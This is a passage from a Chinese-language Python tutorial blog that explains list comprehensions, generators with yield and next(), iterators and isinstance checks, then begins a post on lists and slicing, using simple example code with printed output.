class="line"></span><br><span class="line"><span class="number">2.</span> 还可以使用两层循环，可以生成全排列：</span><br><span class="line"></span><br><span class="line">b = [m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">&#x27;ABC&#x27;</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">&#x27;XYZ&#x27;</span>]</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;AX&#x27;</span>, <span class="string">&#x27;AY&#x27;</span>, <span class="string">&#x27;AZ&#x27;</span>, <span class="string">&#x27;BX&#x27;</span>, <span class="string">&#x27;BY&#x27;</span>, <span class="string">&#x27;BZ&#x27;</span>, <span class="string">&#x27;CX&#x27;</span>, <span class="string">&#x27;CY&#x27;</span>, <span class="string">&#x27;CZ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> <span class="keyword">for</span>循环其实可以同时使用两个甚至多个变量，比如dict的items()可以同时迭代key和value：</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;C&#x27;</span> &#125;</span><br><span class="line">a = [k + <span class="string">&#x27;=&#x27;</span> + v <span class="keyword">for</span> k, v <span class="keyword">in</span> d.items()]</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;x=A&#x27;</span>, <span class="string">&#x27;y=B&#x27;</span>, <span class="string">&#x27;z=C&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-生成器"><a href="#二-生成器" class="headerlink" title="二. 生成器"></a><font color="#FF6347" face="Comic sans MS">二. 生成器</font></h3><p>参考资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/wj-1314/p/8490822.html#undefined">python 生成器和迭代器有这篇就够了</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/python-yield-used-analysis.html">Python yield 使用浅析</a>》</font><br></font></p>
<br>

<p><font color="#00B2EE"><strong>什么是生成器？</strong></font></p>
<p>　　通过列表生成式，我们可以直接创建一个列表，但是，受到内存限制，列表容量肯定是有限的，而且创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。</p>
<p>　　所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间，在Python中，这种一边循环一边计算的机制，称为<strong>生成器：generator</strong></p>
<p>　　生成器是一个特殊的程序，可以被用作控制循环的迭代行为，python中生成器是迭代器的一种，使用yield返回值函数，每次调用yield会暂停，而可以使用next()函数和send()函数恢复生成器。</p>
<p>　　生成器类似于返回值为数组的一个函数，这个函数可以接受参数，可以被调用，但是，不同于一般的函数会一次性返回包括了所有数值的数组，生成器一次只能产生一个值，这样消耗的内存数量将大大减小，而且允许调用函数可以很快的处理前几个返回值，因此生成器看起来像是一个函数，但是表现得却像是迭代器</p>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>python提供了两种生成器基本的方式</strong></font><br><font color="#FF7F00"><strong>生成器函数：</strong></font>也是用def定义的，利用关键字yield一次返回一个结果、阻塞，重新开始<br><font color="#FF7F00"><strong>生成器表达式：</strong></font>返回一个对象，这个对象只有在需要的时候才产生结果</p>
</blockquote>
<br>

<br>

<h4 id="2-1-yield、-next-、send"><a href="#2-1-yield、-next-、send" class="headerlink" title="2.1 yield、__next__()、send()"></a><font color="#3CB371" face="Comic sans MS">2.1 yield、__next__()、send()</font></h4><br>

<ol>
<li><p>带有yield语句的函数不再是一个普通的函数，而是一个生成器generator，可用于迭代。</p>
</li>
<li><p>yield是一个类似return 的关键字，<font color="#FF7F00"><strong>返回一个值或者表达式</strong></font>，迭代一次遇到yield的时候就返回yield后面（代码块）或者右面（单行）的值，然后暂停。</p>
</li>
<li><p>一个函数正常执行遇到yeild时，<font color="#FF7F00"><strong>yeild返回一个值给函数的调用者，然后在这暂停并记住这个位置</strong></font>（因为此时程序要跳转到调用这个函数的地方 =&gt; 因为yeild的返回）<font color="#FF7F00"><strong>！不去执行下一个语句的代码。当程序执行遇到__next__()方法或者next()（Python2用）时，继续执行上次yield的下一个语句直到遇到下一个yield或者该函数结束。</strong></font></p>
</li>
<li><p>send()和next()的区别就在于send可传递参数给yield表达式，这时候传递的参数就会作为yield表达式的值，而yield的参数是返回给调用者的值，也就是说send可以强行修改上一个yield表达式值。</p>
</li>
<li><p>send()和next()都有返回值，他们的返回值是当前迭代遇到的yield的时候，yield后面表达式的值，其实就是当前迭代yield后面的参数。</p>
</li>
<li><p><font color="#FF7F00"><strong>for…in 循环中会自动调用 next()</strong></font>。这就说明for…in能够不中断地执行完整个函数。</p>
</li>
</ol>
<br>

<p>下面举例子说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下面的例子用 a.__next__() 和 print(next(a)) 来说明yeild的返回和暂停</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">例<span class="number">1</span>：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;step 1&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    print(<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">a = odd()</span><br><span class="line">b = a.__next__()  </span><br><span class="line">print(<span class="string">&#x27;*****分割线*****&#x27;</span>)  </span><br><span class="line">print(b) </span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = a.__next__() </span><br><span class="line">print(<span class="string">&#x27;*****分割线*****&#x27;</span>)  </span><br><span class="line">print(c) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：       </span><br><span class="line">step <span class="number">1</span></span><br><span class="line">*****分割线*****</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step <span class="number">2</span></span><br><span class="line">*****分割线*****</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">结论：这个时候在<span class="keyword">yield</span> <span class="number">1</span>处暂停了（输出step1），并且<span class="keyword">yield</span>返回了一个值<span class="number">1</span>给a.__next__() 。</span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="2-2-表达式创建生成器"><a href="#2-2-表达式创建生成器" class="headerlink" title="2.2 表达式创建生成器"></a><font color="#3CB371" face="Comic sans MS">2.2 表达式创建生成器</font></h4><blockquote>
<p><font color="#FF7F00"><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误。</strong></font></p>
</blockquote>
<p>要创建一个generator，有很多种方法，第一种方法很简单，只有<font color="#FF7F00"><strong>把一个列表生成式的[]中括号改为（）小括号</strong></font>，就创建一个generator:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表生成式</span></span><br><span class="line">lis = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line">print(lis)</span><br><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">print(generator_ex)</span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x000002A4CBF9EBA0</span>&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>　　那么创建lis和generator_ex，的区别是什么呢？从表面看就是[  ]和（）,但是结果却不一样，一个打印出来是列表（因为是列表生成式），而第二个打印出来却是&lt;generator object <genexpr> at 0x000002A4CBF9EBA0&gt;，那么如何打印出来generator_ex的每一个元素呢？</p>
<p>　　如果要一个个打印出来，可以通过 <code>__next__()</code> 获得generator的下一个返回值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line">print(generator_ex.__next__())</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">64</span></span><br><span class="line"><span class="number">81</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;列表生成式.py&quot;</span>, line <span class="number">42</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(next(generator_ex))</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>

<br>

<p><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误</strong>，而且上面这样不断调用是一个不好的习惯，正确的方法是使用for循环，因为generator也是可迭代对象。</p>
<p>所以我们创建一个generator后，基本上永远不会调用<code>__next__()</code>，而是通过for循环来迭代，并且不需要关心StopIteration的错误，generator非常强大，如果推算的算法比较复杂，用类似列表生成式的for循环无法实现的时候，还可以用函数来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> generator_ex:</span><br><span class="line">    print(i)</span><br><span class="line">     </span><br><span class="line">结果：</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">64</span></span><br><span class="line"><span class="number">81</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="2-2-函数创建生成器"><a href="#2-2-函数创建生成器" class="headerlink" title="2.2 函数创建生成器"></a><font color="#3CB371" face="Comic sans MS">2.2 函数创建生成器</font></h4><blockquote>
<p><font color="#FF7F00"><strong>如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个生成器。</strong></font></p>
</blockquote>
<br>

<p>下面举例子说明：</p>
<p>著名的斐波那契数列，除第一个和第二个数外，任何一个数都可以由前两个相加得到：</p>
<p>1，1，2，3，5，8，13，21，34…..</p>
<p>斐波那契数列用列表生成式写不出来，但是，用函数把它打印出来却很容易：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fibonacci数列</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">max</span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        print(a)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line">print(fib(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<blockquote>
<p>a,b = b ,a+b  其实相当于 t =a+b ,a =b ,b =t  ，所以不必写显示写出临时变量t，就可以输出斐波那契数列的前N个数字。</p>
</blockquote>
<br>

<p>上面我们发现，print(b)每次函数运行都要打印，占内存，所以为了不占内存，我们也可以使用生成器，同样是使用函数，只不过函数中有 <code>yield</code> 语句，所以叫做生成器。但是返回的不再是一个值，而是一个生成器，和上面的例子一样。</p>
<p>那么这样就不占内存了，这里说一下generator和函数的执行流程，函数是顺序执行的，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用__next__()方法的时候执行，遇到yield语句返回，再次被__next__() 调用时候从上次的返回yield语句处继续执行，也就是用多少，取多少，不占内存。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">max</span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line">print(fib(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&lt;generator object fib at <span class="number">0x000001C03AC34FC0</span>&gt;</span><br></pre></td></tr></table></figure>



<br>

<p>下面用3个例子说明用for…in 循环的好处，但是拿不到return 语句的返回值，那么就会报错，所以为了不让报错，就要进行异常处理，拿到返回值，如果想要拿到返回值，必须捕获StopIteration错误，而返回值包含在StopIteration的value中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 使用__next__()方法到最后一个的下一个时会报错。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">max</span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line">print(fib(<span class="number">6</span>))</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(<span class="string">&quot;可以顺便干其他事情&quot;</span>)</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">&lt;generator object fib at <span class="number">0x01058B70</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">可以顺便干其他事情</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">Traceback (most recent call last):       //看到报错，并且 StopIteration: done</span><br><span class="line">  File <span class="string">&quot;3.py&quot;</span>, line <span class="number">18</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(a.__next__())</span><br><span class="line">StopIteration: done</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 在上面fib的例子，我们在循环过程中不断调用<span class="keyword">yield</span>，就会不断中断。当然要给循环设置一个条件来退出循环，</span><br><span class="line">   不然就会产生一个无限数列出来。把函数改成generator后，我们基本上从来不会用next()来获取下一个</span><br><span class="line">   返回值，而是直接使用<span class="keyword">for</span>循环来迭代，但是拿不到<span class="keyword">return</span> 语句的返回值：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">max</span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fib(<span class="number">6</span>):</span><br><span class="line">    print(i)</span><br><span class="line">     </span><br><span class="line">结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span>             //程序没报错，但是拿不到<span class="keyword">return</span>返回的值。</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">max</span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line">g = fib(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = next(g)</span><br><span class="line">        print(<span class="string">&#x27;generator: &#x27;</span>,x)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;生成器返回值：&quot;</span>,e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">generator:  <span class="number">1</span></span><br><span class="line">generator:  <span class="number">1</span></span><br><span class="line">generator:  <span class="number">2</span></span><br><span class="line">generator:  <span class="number">3</span></span><br><span class="line">generator:  <span class="number">5</span></span><br><span class="line">generator:  <span class="number">8</span></span><br><span class="line">生成器返回值： done      //拿到了<span class="keyword">return</span>的返回值！</span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="三-迭代器"><a href="#三-迭代器" class="headerlink" title="三. 迭代器"></a><font color="#FF6347" face="Comic sans MS">三. 迭代器</font></h3><blockquote>
<p><font color="#FF7F00"><strong>迭代就是循环，迭代器功能是把一个可迭代的对象转换为生成器。因为生成器本身就是可迭代的。</strong></font><br>迭代器包含有next方法的实现，在正确的范围内返回期待的数据以及超出范围后能够抛出StopIteration的错误停止迭代。</p>
</blockquote>
<br>

<blockquote>
<p><font color="#00B2EE"><strong>可以直接作用于for循环的数据类型有以下几种：</strong></font><br><font color="#FF7F00"><strong>一类是集合数据类型：</strong></font>如list,tuple,dict,set,str等；<br><font color="#FF7F00"><strong>一类是generator：</strong></font>包括生成器和带yield的generator 函数。</p>
</blockquote>
<br>

<br>

<h4 id="3-1-可迭代对象"><a href="#3-1-可迭代对象" class="headerlink" title="3.1 可迭代对象"></a><font color="#3CB371" face="Comic sans MS">3.1 可迭代对象</font></h4><p>这些可以直接作用于for 循环的对象统称为<font color="#00B2EE"><strong>可迭代对象：Iterable</strong></font><br>可以使用 <strong><code>isinstance()</code></strong> 判断一个对象是否为可Iterable对象！</p>
<p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-isinstance.html">Python isinstance() 函数</a>]</font></p>
<br>

<p><strong>语法</strong></p>
<p><code>isinstance(object, classinfo)</code></p>
<p><strong>参数</strong><br>object – 实例对象。<br>classinfo – 可以是直接或间接类名、基本类型或者由它们组成的元组。</p>
<p><strong>返回值</strong><br>如果两个参数类型（classinfo）相同则返回 True，否则返回 False。</p>
<br>

<br>

<h4 id="3-2-迭代器"><a href="#3-2-迭代器" class="headerlink" title="3.2 迭代器"></a><font color="#3CB371" face="Comic sans MS">3.2 迭代器</font></h4><p>一个实现了iter方法的对象时可迭代的，一个实现next方法的对象是迭代器<br>可以被next()函数调用并不断返回下一个值的对象称为<font color="#00B2EE"><strong>迭代器：Iterator</strong></font>。<br>可以使用isinstance()判断一个对象是否是Iterator对象</p>
<p>所以，整体的流程为：</p>
<ol>
<li><p>使用isinstance()判断一个对象是否为Iterable对象（可迭代对象），语法为<code>isinstance(对象,Iterable)</code>。返回Ture/False。</p>
</li>
<li><p>如果返回 Ture，使用 <code>iter(可迭代对象)</code> 即可得到返回值为生成器的东西。</p>
</li>
<li><p>然后就可以把这个返回值作为生成器去尽情的使用了。</p>
</li>
</ol>
<br>

<p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-iter.html">Python iter() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font></p>
</blockquote>
<ol>
<li>凡是可作用于for循环的对象都是Iterable类型；</li>
<li>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</li>
<li>生成器都是Iterator对象，但list、dict、str虽然是Iterable（可迭代对象），却不是Iterator（迭代器）。</li>
<li>iter()返回值是迭代器对象。</li>
</ol>
<br>

<p>举例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable,Iterator</span><br><span class="line">print(isinstance(<span class="string">&#x27;abc&#x27;</span>, Iterable))</span><br><span class="line">print(isinstance([], Iterable))</span><br><span class="line">print(isinstance(&#123;&#125;, Iterable))</span><br><span class="line">print(isinstance((x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)), Iterable))</span><br><span class="line">print(isinstance(<span class="number">100</span>, Iterable))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(isinstance((x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)), Iterator))</span><br><span class="line">print(isinstance([], Iterator))</span><br><span class="line">print(isinstance(&#123;&#125;, Iterator))</span><br><span class="line">print(isinstance(<span class="string">&#x27;abc&#x27;</span>, Iterator))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(isinstance(iter([]), Iterator))</span><br><span class="line">print(isinstance(iter(<span class="string">&#x27;abc&#x27;</span>), Iterator))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-列表、元组、字典、集合</title>
    <url>/post/Python-list-tuple-dict-set/</url>
    <content><![CDATA[<p>Python的列表相当于数组 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<a id="more"></a>


<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 列表、元组、字典、集合</font> </center>


<br>

<br>

<h3 id="一-认识列表"><a href="#一-认识列表" class="headerlink" title="一. 认识列表"></a><font color="#FF6347" face="Comic sans MS">一. 认识列表</font></h3><br>

<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>列表（list）是什么：</strong></font></p>
</blockquote>
<ol>
<li>序列是Python中最基本的数据结构。</li>
<li>在Python中，用方括号 [ ] 来表示列表，并用逗号来分隔其中的元素。并且<font color="#FF7F00"><strong>列表的数据项（各个元素）不需要具有相同的类型</strong></font>。</li>
<li>序列中的每个元素都分配一个数字 - 它的位置，即索引，<font color="#FF7F00"><strong>第一个索引是0，第二个索引是1，依此类推</strong></font>。<ol>
<li>序列都可以进行的操作包括索引，切片，加，乘，检查成员。</li>
<li>此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。</li>
</ol>
</li>
<li>把列表当作堆栈使用。涉及的方法有：append()、pop()</li>
<li>访问和使用列表可以使用切片。[a:b]</li>
<li>把列表当作队列使用（不过使用起来较麻烦，可自行百度）。</li>
<li>列表可以<font color="#FF7F00"><strong>嵌套使用</strong></font>。</li>
<li>列表复制是这样的：<code>list2 = list1[:]</code></li>
<li>获取列表的索引值：<code>a = list.index(&quot;String&quot;)</code></li>
</ol>
<br>

<p>定义列表的示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">list3 = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line">print(list1)</span><br><span class="line">print(list2)</span><br><span class="line">print(list3)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>] </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] </span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>] </span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="二-切片"><a href="#二-切片" class="headerlink" title="二. 切片"></a><font color="#FF6347" face="Comic sans MS">二. 切片</font></h3><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>切片和索引：</strong></font></p>
</blockquote>
<ol>
<li>与字符串的索引一样，列表索引从0开始。(在字符串那个章节总结过)列表可以进行截取、组合等；</li>
<li>你还可以处理列表的部分元素——Python称之为切片。使用下标索引来访问列表中的值，同样你也可以使用方括号[ ]的形式截取字符； [x:y]</li>
<li>要创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样，Python在<font color="#FF7F00"><strong>到达你指定的第二个索引前面的元素后停止</strong></font>。要输出列表中的前三个元素，需要指定索引<code>0~3</code>，这将输出分别为0 、1 和2 的元素； [1:5]表示索引为1,2,3,4的四个元素</li>
<li>如果你没有指定第一个索引，Python将自动从列表开头开始； [ :6]</li>
<li>要让切片终止于列表末尾，也可使用类似的语法，即不指定第二个索引； [2: ]<br>无论列表多长，这种语法都能够让你输出从特定位置到列表末尾的所有元素。</li>
<li>如果要遍历列表的部分元素，可在for 循环中使用切片。</li>
</ol>
<br>

<p>下面示例代码（注意“//”不代表注释，仅仅为了展示）：</p>
